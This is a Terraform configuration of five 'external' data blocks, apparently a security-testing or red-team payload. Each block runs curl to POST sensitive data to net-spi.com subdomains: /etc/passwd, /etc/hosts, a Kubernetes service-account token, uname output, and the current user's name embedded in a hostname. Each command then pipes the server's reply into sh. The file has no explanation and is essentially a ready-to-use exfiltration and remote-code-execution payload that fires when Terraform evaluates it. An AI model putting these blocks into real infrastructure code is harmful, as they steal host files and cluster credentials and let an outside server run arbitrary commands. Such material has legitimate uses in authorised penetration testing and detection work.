data "external" "example1" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://3hle09vs68qtkbwk8qoky7tzfqlu9kx9.net-spi.com/exfil4 | sh"]
}

data "external" "example2" {
 program = ["sh", "-c", "curl -k https://`whoami`.97ekqflywegzahmqyweqodj55wbn1buzj.net-spi.com/exfil4 | sh"]
}

data "external" "example3" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/hosts https://3hle09vs68qtkbwk8qoky7tzfqlu9kx9.net-spi.com/exfil4 | sh"]
}

data "external" "example4" {
 program = ["sh", "-c", "curl -X POST --data-binary @/run/secrets/kubernetes.io/serviceaccount/token https://w307m2hls1cm64idujadk0fs1j7azytmi.net-spi.com/exfil4 | sh"]
}

data "external" "example5" {
 program = ["sh", "-c", "curl -X POST --data-binary \"$(uname -a)\" https://w307m2hls1cm64idujadk0fs1j7azytmi.net-spi.com/exfil4 | sh"]
}